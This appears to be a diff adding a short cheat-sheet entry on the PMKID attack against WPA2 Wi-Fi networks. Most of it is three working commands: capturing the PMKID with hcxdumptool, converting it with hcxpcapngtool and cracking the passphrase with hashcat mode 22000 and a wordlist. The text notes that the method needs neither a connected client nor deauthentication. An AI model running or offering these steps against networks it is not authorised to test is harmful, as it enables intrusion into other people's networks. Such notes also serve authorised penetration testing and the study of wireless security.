@@ -1,0 +1,13 @@
+This can be used to crack WPA2 networks without waiting for a client to connect or performing deauthentication attacks.
+
+Capture the PMKID and save to pcapng file
+
+hcxdumptool -i $interface$ -w pmkid.pcapng --rds=1 -c 6a
+
+Then convert the capture to hashcat format
+
+hcxpcapngtool -o hashes.hc22000 pmkid.pcapng
+
+Crack with hashcat using a dictionary attack
+
+hashcat -m 22000 hashes.hc22000 wordlist.txt
